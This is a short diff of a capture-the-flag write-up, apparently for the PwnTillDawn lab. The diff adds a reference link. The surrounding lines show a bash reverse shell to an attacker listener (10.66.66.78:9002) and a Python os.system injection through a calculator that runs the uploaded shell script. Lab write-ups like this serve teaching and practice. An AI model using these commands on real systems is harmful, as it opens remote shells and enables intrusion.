@@ -83,4 +83,7 @@ bash -c  'bash -i>&/dev/tcp/10.66.66.78/9002 0>&1'
 
 Once our bash file is on the target, we can execute the bash file using the pythin calculator. We simply do this using the command
 `__import__("os").system("/bin/bash /tmp/shell.sh")`<br>
-![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)
+![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)<br><br>
+
+
+Referrence: <a href="https://online.pwntilldawn.com/">PwnTillDawn Online battlefield</a>
